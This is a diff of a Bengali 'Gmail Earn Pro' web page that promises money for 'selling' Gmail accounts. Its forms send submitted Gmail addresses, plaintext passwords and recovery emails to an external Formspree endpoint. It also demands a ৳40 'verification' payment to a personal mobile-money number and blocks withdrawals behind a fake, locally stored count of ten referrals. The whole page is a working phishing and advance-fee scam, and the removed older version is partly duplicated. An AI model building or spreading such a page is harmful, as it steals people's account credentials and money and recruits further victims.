@@ -3,16 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gmail Earn Pro - জিমেইল বিক্রি করে ইনকাম করুন</title>
+    <title>Gmail Earn Pro - জিমেইল বিক্রি ও ইনকাম</title>
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
         body { background-color: #f4f7f6; color: #333; }
         header { background: #d93025; color: white; padding: 15px 20px; text-align: center; }
         .container { max-width: 900px; margin: 20px auto; padding: 0 15px; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; margin-bottom: 20px; }
         .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; }
-        .card h3 { color: #666; font-size: 14px; margin-bottom: 5px; }
-        .card p { font-size: 24px; font-weight: bold; color: #d93025; }
+        .card h3 { color: #666; font-size: 13px; margin-bottom: 5px; }
+        .card p { font-size: 22px; font-weight: bold; color: #d93025; }
         .form-section { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-bottom: 20px; }
         .form-section h2 { margin-bottom: 15px; font-size: 20px; color: #1a73e8; }
         .form-group { margin-bottom: 15px; }
@@ -21,13 +21,10 @@
         .btn { background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; width: 100%; font-weight: bold; }
         .btn:hover { background: #1557b0; }
         .btn-withdraw { background: #28a745; margin-top: 10px; }
-        .btn-withdraw:hover { background: #218838; }
-        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
-        table, th, td { border: 1px solid #ddd; }
-        th, td { padding: 10px; text-align: left; font-size: 14px; }
-        th { background: #f8f9fa; }
-        .status-pending { color: #ffc107; font-weight: bold; }
-        .status-approved { color: #28a745; font-weight: bold; }
+        .btn-verify { background: #ff9800; margin-top: 10px; }
+        .notice-box { background: #fff3cd; border: 1px solid #ffe8a1; padding: 15px; border-radius: 8px; margin-bottom: 20px; color: #856404; font-size: 14px; line-height: 1.6; }
+        .hidden { display: none; }
+        .ref-box { background: #e8f0fe; padding: 12px; border-radius: 5px; font-weight: bold; color: #1a73e8; word-break: break-all; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -38,216 +35,183 @@
     </header>
 
     <div class="container">
-        <!-- Dashboard Statistics -->
-        <div class="stats-grid">
-            <div class="card">
-                <h3>মোট জমা দেওয়া জিমেইল</h3>
-                <p id="totalSubmitted">0 টি</p>
-            </div>
-            <div class="card">
-                <h3>প্রতি জিমেইল রেট</h3>
-                <p>৳ ১০.০০</p>
-            </div>
-            <div class="card">
-                <h3>বর্তমান ব্যালেন্স</h3>
-                <p id="totalBalance">৳ 0.00</p>
-            </div>
-        </div>
 
-        <!-- Submit Gmail Form -->
-        <div class="form-section">
-            <h2>নতুন জিমেইল জমা দিন</h2>
-            <form action="https://formspree.io/f/moeaqbwb" method="POST" id="gmailForm">
-                <input type="hidden" name="_subject" value="নতুন জিমেইল বিক্রি জমা এসেছে!">
+        <!-- Auth Section (Register/Login) -->
+        <div id="authSection" class="form-section">
+            <h2>অ্যাকাউন্টে সাইন ইন / রেজিস্ট্রেশন করুন</h2>
+            <form id="loginForm">
                 <div class="form-group">
-                    <label for="gmail">জিমেইল এড্রেস</label>
-                    <input type="email" name="Gmail_Address" id="gmail" placeholder="example@gmail.com" required>
+                    <label for="userName">আপনার নাম</label>
+                    <input type="text" id="userName" placeholder="আপনার পুরো নাম" required>
                 </div>
                 <div class="form-group">
-                    <label for="password">পাসওয়ার্ড</label>
-                    <input type="text" name="Password" id="password" placeholder="জিমেইলের পাসওয়ার্ড" required>
+                    <label for="userPhone">মোবাইল নম্বর</label>
+                    <input type="text" id="userPhone" placeholder="017XXXXXXXX" required>
                 </div>
                 <div class="form-group">
-                    <label for="recovery">রিকভারি ইমেইল (যদি থাকে)</label>
-                    <input type="email" name="Recovery_Email" id="recovery" placeholder="recovery@example.com">
+                    <label for="userPass">পাসওয়ার্ড</label>
+                    <input type="password" id="userPass" placeholder="পাসওয়ার্ড দিন" required>
                 </div>
-                <button type="submit" class="btn">জিমেইল জমা দিন</button>
+                <button type="submit" class="btn">অ্যাকাউন্টে প্রবেশ করুন</button>
             </form>
         </div>
 
-        <!-- Withdraw Section -->
-        <div class="form-section">
-            <h2>টাকা তুলুন (Withdraw)</h2>
-            <form action="https://formspree.io/f/moeaqbwb" method="POST" id="withdrawForm">
-                <input type="hidden" name="_subject" value="নতুন উইথড্র রিকোয়েস্ট এসেছে!">
-                <div class="form-group">
-                    <label for="method">পেমেন্ট মেথড</label>
-                    <select name="Payment_Method" id="method" required>
-                        <option value="bkash">বিকাশ (bKash)</option>
-                        <option value="nagad">নগদ (Nagad)</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label for="accountNumber">পার্সোনাল মোবাইল নম্বর</label>
-                    <input type="text" name="Phone_Number" id="accountNumber" placeholder="017XXXXXXXX" required>
-                </div>
-                <div class="form-group">
-                    <label for="amount">টাকার পরিমাণ (সর্বনিম্ন ৳ ৫০)</label>
-                    <input type="number" name="Amount" id="amount" min="50" placeholder="50" required>
-                </div>
-                <button type="submit" class="btn btn-withdraw">উইথড্র রিকোয়েস্ট পাঠান</button>
-            </form>
-        </div>
+        <!-- Main Dashboard -->
+        <div id="dashboardSection" class="hidden">
 
-        <!-- Submitted History -->
-        <div class="form-section">
-            <h2>আপনার জিমেইল জমার হিস্ট্রি</h2>
-            <table>
-                <thead>
-                    <tr>
-                        <th>তারিখ</th>
-                        <th>জিমেইল</th>
-                        <th>পাসওয়ার্ড</th>
-                        <th>স্ট্যাটাস</th>
-                    </tr>
-                </thead>
-                <tbody id="historyTable">
-                    <!-- Dynamic Data -->
-                </tbody>
-            </table>
-        </div>
-    </div>
-
-</body>
-</html>        <p>জিমেইল জমা দিন এবং সাথে সাথে টাকা আয় করুন</p>
-    </header>
-
-    <div class="container">
-        <!-- Dashboard Statistics -->
-        <div class="stats-grid">
-            <div class="card">
-                <h3>মোট জমা দেওয়া জিমেইল</h3>
-                <p id="totalSubmitted">0 টি</p>
+            <!-- Verification Notice Box -->
+            <div class="notice-box">
+                📢 <strong>জরুরি নিয়মাবলী:</strong><br>
+                ১. অ্যাকাউন্ট ভেরিফাই করতে বিকাশ/নগদ (Personal) <strong>01795190524</strong> নম্বরে <strong>৳ ৪০.০০</strong> সেন্ড মানি করে TrxID জমা দিন।<br>
+                ২. টাকা তোলার জন্য (উইথড্র) কমপক্ষে <strong>১০ জন সফল রেফারেল</strong> সম্পন্ন করা বাধ্যতামূলক!
             </div>
-            <div class="card">
-                <h3>প্রতি জিমেইল রেট</h3>
-                <p>৳ ১০.০০</p>
+
+            <!-- Dashboard Statistics -->
+            <div class="stats-grid">
+                <div class="card">
+                    <h3>মোট জমা জিমেইল</h3>
+                    <p id="totalSubmitted">0 টি</p>
+                </div>
+                <div class="card">
+                    <h3>প্রতি জিমেইল রেট</h3>
+                    <p>৳ ৩০.০০</p>
+                </div>
+                <div class="card">
+                    <h3>মোট রেফারাল</h3>
+                    <p id="refCountCount">0 / 10</p>
+                </div>
+                <div class="card">
+                    <h3>বর্তমান ব্যালেন্স</h3>
+                    <p id="totalBalance">৳ 0.00</p>
+                </div>
             </div>
-            <div class="card">
-                <h3>বর্তমান ব্যালেন্স</h3>
-                <p id="totalBalance">৳ 0.00</p>
+
+            <!-- Verify Account Section -->
+            <div class="form-section">
+                <h2>অ্যাকাউন্ট ভেরিফাই করুন (ফি: ৳ ৪০)</h2>
+                <form action="https://formspree.io/f/xrpzgdyb" method="POST">
+                    <input type="hidden" name="_subject" value="নতুন অ্যাকাউন্ট ভেরিফিকেশন রিকোয়েস্ট!">
+                    <input type="hidden" class="userPhoneHidden" name="User_Phone">
+                    <div class="form-group">
+                        <label for="verifyMethod">পেমেন্ট মেথড</label>
+                        <select name="Payment_Method" required>
+                            <option value="bkash">বিকাশ (01795190524)</option>
+                            <option value="nagad">নগদ (01795190524)</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="senderNumber">যে নম্বর থেকে টাকা পাঠিয়েছেন</label>
+                        <input type="text" name="Sender_Number" placeholder="017XXXXXXXX" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="trxId">Transaction ID (TrxID)</label>
+                        <input type="text" name="TrxID" placeholder="8N7X6W..." required>
+                    </div>
+                    <button type="submit" class="btn btn-verify">ভেরিফিকেশন সাবমিট করুন</button>
+                </form>
             </div>
+
+            <!-- Submit Gmail Form -->
+            <div class="form-section">
+                <h2>নতুন জিমেইল জমা দিন</h2>
+                <form action="https://formspree.io/f/xrpzgdyb" method="POST" id="gmailForm">
+                    <input type="hidden" name="_subject" value="নতুন জিমেইল বিক্রি জমা এসেছে!">
+                    <input type="hidden" class="userPhoneHidden" name="User_Phone">
+                    <div class="form-group">
+                        <label for="gmail">জিমেইল এড্রেস</label>
+                        <input type="email" name="Gmail_Address" id="gmail" placeholder="example@gmail.com" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">পাসওয়ার্ড</label>
+                        <input type="text" name="Password" id="password" placeholder="জিমেইলের পাসওয়ার্ড" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="recovery">রিকভারি ইমেইল (যদি থাকে)</label>
+                        <input type="email" name="Recovery_Email" id="recovery" placeholder="recovery@example.com">
+                    </div>
+                    <button type="submit" class="btn">জিমেইল জমা দিন</button>
+                </form>
+            </div>
+
+            <!-- Withdraw Section -->
+            <div class="form-section">
+                <h2>টাকা তুলুন (Withdraw)</h2>
+                <form action="https://formspree.io/f/xrpzgdyb" method="POST" id="withdrawForm">
+                    <input type="hidden" name="_subject" value="নতুন উইথড্র রিকোয়েস্ট এসেছে!">
+                    <input type="hidden" class="userPhoneHidden" name="User_Phone">
+                    <div class="form-group">
+                        <label for="method">পেমেন্ট মেথড</label>
+                        <select name="Payment_Method" id="method" required>
+                            <option value="bkash">বিকাশ (bKash)</option>
+                            <option value="nagad">নগদ (Nagad)</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="accountNumber">পার্সোনাল মোবাইল নম্বর</label>
+                        <input type="text" name="Phone_Number" id="accountNumber" placeholder="017XXXXXXXX" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="amount">টাকার পরিমাণ (সর্বনিম্ন ৳ ১০০)</label>
+                        <input type="number" name="Amount" id="amount" min="100" placeholder="100" required>
+                    </div>
+                    <button type="submit" class="btn btn-withdraw">উইথড্র রিকোয়েস্ট পাঠান</button>
+                </form>
+            </div>
+
+            <!-- Refer & Earn Section -->
+            <div class="form-section">
+                <h2>রেফার করে ইনকাম করুন (১০ রেফার আবশ্যক)</h2>
+                <p style="font-size: 14px; color: #555;">উইথড্র করতে হলে অন্তত ১০ টি সফল রেফার সম্পূর্ণ করতে হবে। নিচের রেফার লিঙ্কটি শেয়ার করুন:</p>
+                <div class="ref-box" id="refLink">https://giammia27-ops.github.io/index.html?ref=user</div>
+            </div>
+
         </div>
 
-        <!-- Submit Gmail Form -->
-        <div class="form-section">
-            <h2>নতুন জিমেইল জমা দিন</h2>
-            <form id="gmailForm">
-                <div class="form-group">
-                    <label for="gmail">জিমেইল এড্রেস</label>
-                    <input type="email" id="gmail" placeholder="example@gmail.com" required>
-                </div>
-                <div class="form-group">
-                    <label for="password">পাসওয়ার্ড</label>
-                    <input type="text" id="password" placeholder="জিমেইলের পাসওয়ার্ড" required>
-                </div>
-                <div class="form-group">
-                    <label for="recovery">রিকভারি ইমেইল (যদি থাকে)</label>
-                    <input type="email" id="recovery" placeholder="recovery@example.com">
-                </div>
-                <button type="submit" class="btn">জিমেইল জমা দিন</button>
-            </form>
-        </div>
-
-        <!-- Withdraw Section -->
-        <div class="form-section">
-            <h2>টাকা তুলুন (Withdraw)</h2>
-            <form id="withdrawForm">
-                <div class="form-group">
-                    <label for="method">পেমেন্ট মেথড</label>
-                    <select id="method" required>
-                        <option value="bkash">বিকাশ (bKash)</option>
-                        <option value="nagad">নগদ (Nagad)</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label for="accountNumber">পার্সোনাল মোবাইল নম্বর</label>
-                    <input type="text" id="accountNumber" placeholder="017XXXXXXXX" required>
-                </div>
-                <div class="form-group">
-                    <label for="amount">টাকার পরিমাণ (সর্বনিম্ন ৳ ৫০)</label>
-                    <input type="number" id="amount" min="50" placeholder="50" required>
-                </div>
-                <button type="submit" class="btn btn-withdraw">উইথড্র রিকোয়েস্ট পাঠান</button>
-            </form>
-        </div>
-
-        <!-- Submitted History -->
-        <div class="form-section">
-            <h2>আপনার জিমেইল জমার হিস্ট্রি</h2>
-            <table>
-                <thead>
-                    <tr>
-                        <th>তারিখ</th>
-                        <th>জিমেইল</th>
-                        <th>পাসওয়ার্ড</th>
-                        <th>স্ট্যাটাস</th>
-                    </tr>
-                </thead>
-                <tbody id="historyTable">
-                    <!-- Dynamic Data will appear here -->
-                </tbody>
-            </table>
-        </div>
     </div>
 
     <script>
-        let submittedCount = 0;
-        let balance = 0;
-        const ratePerGmail = 10; // প্রতি জিমেইলের দাম ১০ টাকা
+        // Check local login status
+        const currentUser = localStorage.getItem('gmeUser');
+        let currentRefCount = parseInt(localStorage.getItem('gmeRefCount') || "0");
 
-        document.getElementById('gmailForm').addEventListener('submit', function(e) {
+        if(currentUser) {
+            showDashboard(currentUser);
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
+            const phone = document.getElementById('userPhone').value;
+            localStorage.setItem('gmeUser', phone);
             
-            const gmail = document.getElementById('gmail').value;
-            const password = document.getElementById('password').value;
-            const date = new Date().toLocaleDateString();
+            // Check query parameter for referral
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('ref')) {
+                currentRefCount += 1;
+                localStorage.setItem('gmeRefCount', currentRefCount);
+            }
 
-            // Update Stats
-            submittedCount++;
-            balance += ratePerGmail;
-
-            document.getElementById('totalSubmitted').innerText = submittedCount + " টি";
-            document.getElementById('totalBalance').innerText = "৳ " + balance.toFixed(2);
-
-            // Add to Table
-            const table = document.getElementById('historyTable');
-            const row = table.insertRow(0);
-            row.innerHTML = `
-                <td>${date}</td>
-                <td>${gmail}</td>
-                <td>${password}</td>
-                <td><span class="status-pending">Pending Review</span></td>
-            `;
-
-            alert("জিমেইল সফলভাবে জমা হয়েছে! অ্যাডমিন চেক করে এপ্রুভ করবেন।");
-            document.getElementById('gmailForm').reset();
+            showDashboard(phone);
         });
 
-        document.getElementById('withdrawForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const amount = parseFloat(document.getElementById('amount').value);
-            const number = document.getElementById('accountNumber').value;
+        function showDashboard(phone) {
+            document.getElementById('authSection').classList.add('hidden');
+            document.getElementById('dashboardSection').classList.remove('hidden');
+            
+            const hiddenInputs = document.querySelectorAll('.userPhoneHidden');
+            hiddenInputs.forEach(input => input.value = phone);
+            
+            document.getElementById('refCountCount').innerText = currentRefCount + " / 10";
+            document.getElementById('refLink').innerText = `https://giammia27-ops.github.io/index.html?ref=${phone}`;
+        }
 
-            if (amount > balance) {
-                alert("আপনার ওয়ালেটে পর্যাপ্ত ব্যালেন্স নেই!");
-            } else {
-                balance -= amount;
-                document.getElementById('totalBalance').innerText = "৳ " + balance.toFixed(2);
-                alert(`৳ ${amount} টাকা ${number} নম্বরে উইথড্র রিকোয়েস্ট সফল হয়েছে!`);
-                document.getElementById('withdrawForm').reset();
+        // Restrict withdraw if referral count < 10
+        document.getElementById('withdrawForm').addEventListener('submit', function(e) {
+            if (currentRefCount < 10) {
+                e.preventDefault();
+                alert(`আপনার এখনও ১০ টি রেফার পূরণ হয়নি! (বর্তমানে রয়েছে: ${currentRefCount} টি)। উইথড্র করতে কমপক্ষে ১০ জন বন্ধুকে রেফার করুন।`);
             }
         });
     </script>
+
 </body>
 </html>
